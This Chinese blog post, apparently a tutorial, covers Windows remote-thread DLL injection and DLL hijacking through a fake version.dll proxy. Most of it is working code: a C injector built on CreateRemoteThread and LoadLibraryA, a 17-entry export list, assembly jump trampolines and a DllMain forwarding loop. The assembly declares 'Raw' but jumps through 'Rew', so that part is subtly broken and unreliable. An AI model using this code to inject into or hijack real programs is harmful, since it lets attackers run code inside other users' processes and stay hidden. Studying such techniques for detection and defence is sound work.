---
title: "注入技术(1)：远程线程、劫持注入"
date: 2021-05-06T12:00:00+08:00
lastmod: 2021-05-06T12:00:00+08:00
draft: false
author: "Shinn"
images: []
tags: ["注入技术"]
categories: ["Security Research"]

twemoji: false
lightgallery: true
---

<!--more-->

## 远程线程注入

1. 远程线程注入原理非常简单，可以说是新手必学的一个注入手法：

```c
1. OpenProcess			打开目标进程，拿句柄
2. VirtualAllocEx		在目标进程里分配一块内存
3. WriteProcessMemory	把DLL的完整路径字符串写进去
4. CreateRemoteThread	在目标进程里创建远程线程
						线程入口 = LoadLibraryA
						线程参数 = 刚才写入的DLL路径字符串地址
```



### 实验代码

1. 核心代码如下所示：

```c
#include <Windows.h>
#include <stdio.h>

int main()
{
	// 1. 打开目标进程
	ULONG Pid = 0;
	scanf_s("%d", &Pid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	// 2. 在目标进程里分配一块内存，放DLL路径
	CHAR DllPath[MAX_PATH] = "C:\\Test.dll";
	PVOID RemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof DllPath,
		MEM_COMMIT, PAGE_READWRITE);

	// 3. 把DLL路径写过去
	WriteProcessMemory(hProcess, RemoteBuffer, DllPath, sizeof DllPath, NULL);

	// 4. 创建远程线程：入口 = LoadLibraryA，参数 = DLL路径地址
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryA, RemoteBuffer, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	// 5. 收尾
	VirtualFreeEx(hProcess, RemoteBuffer, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
```

2. 如果要卸载DLL，那再启动一条远程线程，线程回调换成`FreeLibrary`，参数换成模块基址
1. 远程线程注入虽然简单、易学，但是缺点非常明显：走的还是正规模块加载流程，`PEB.Ldr`模块链表有登记，ARK工具一眼就能找到不正常的模块信息



## 劫持注入（DLL劫持）

### 劫持原理

1. Windows加载器搜索DLL是有先后顺序的，优先级从高到低如下所示：
    1. **应用程序所在目录**
    2. 系统目录System32
    3. Windows目录、PATH环境变量
2. 劫持注入的思路：**伪造一个系统DLL放进exe目录**，exe启动时加载器在第一步就命中我们的假DLL
3. 选择伪造`version.dll`是因为大量程序会导入它（获取版本信息），确保伪造框架**通用性**



### 导出表（Source.def）

1. 把真`version.dll`的17个导出一比一列出来，如下所示：

```c
LIBRARY
	EXPORTS
		GetFileVersionInfoA
		GetFileVersionInfoByHandle
		GetFileVersionInfoExA
		GetFileVersionInfoExW
		GetFileVersionInfoSizeA
		GetFileVersionInfoSizeExA
		GetFileVersionInfoSizeExW
		GetFileVersionInfoSizeW
		GetFileVersionInfoW
		VerFindFileA
		VerFindFileW
		VerInstallFileA
		VerInstallFileW
		VerLanguageNameA
		VerLanguageNameW
		VerQueryValueA
		VerQueryValueW
```



### 汇编跳板（CALL.asm）

1. 每个导出都是一个小跳板，跳到全局数组`Raw`对应的槽位，如下所示：

```asm
extern Raw:far

.code

GetFileVersionInfoA proc
jmp qword ptr [Rew + 8 * 1]
GetFileVersionInfoA endp

GetFileVersionInfoByHandle proc
JMP QWORD PTR [Rew + 8 * 2]
GetFileVersionInfoByHandle endp

GetFileVersionInfoExA proc
JMP QWORD PTR [Rew + 8 * 3]
GetFileVersionInfoExA endp

GetFileVersionInfoExW proc
JMP QWORD PTR [Rew + 8 * 4]
GetFileVersionInfoExW endp

GetFileVersionInfoSizeA proc
JMP QWORD PTR [Rew + 8 * 5]
GetFileVersionInfoSizeA endp

GetFileVersionInfoSizeExA proc
JMP QWORD PTR [Rew + 8 * 6]
GetFileVersionInfoSizeExA endp

GetFileVersionInfoSizeExW proc
JMP QWORD PTR [Rew + 8 * 7]
GetFileVersionInfoSizeExW endp

GetFileVersionInfoSizeW proc
JMP QWORD PTR [Rew + 8 * 8]
GetFileVersionInfoSizeW endp

GetFileVersionInfoW proc
JMP QWORD PTR [Rew + 8 * 9]
GetFileVersionInfoW endp

VerFindFileA proc
JMP QWORD PTR [Rew + 8 * 10]
VerFindFileA endp

VerFindFileW proc
JMP QWORD PTR [Rew + 8 * 11]
VerFindFileW endp

VerInstallFileA proc
JMP QWORD PTR [Rew + 8 * 12]
VerInstallFileA endp

VerInstallFileW proc
JMP QWORD PTR [Rew + 8 * 13]
VerInstallFileW endp

VerLanguageNameA proc
JMP QWORD PTR [Rew + 8 * 14]
VerLanguageNameA endp

VerLanguageNameW proc
JMP QWORD PTR [Rew + 8 * 15]
VerLanguageNameW endp

VerQueryValueA proc
JMP QWORD PTR [Rew + 8 * 16]
VerQueryValueA endp

VerQueryValueW proc
JMP QWORD PTR [Rew + 8 * 17]
VerQueryValueW endp

end
```



### 初始化

1. 在`DllMain`里把真`version.dll`的函数地址按序号填进`Raw`数组，代码如下所示：

```c
	for (size_t i = 1; i <= 17; i++)
	{
		Raw[i] = (UINT_PTR) GetProcAddress(hVersionDll, (PCHAR)i);//获取模块中导出函数的地址 arg1=模块句柄 arg2=
	}
```
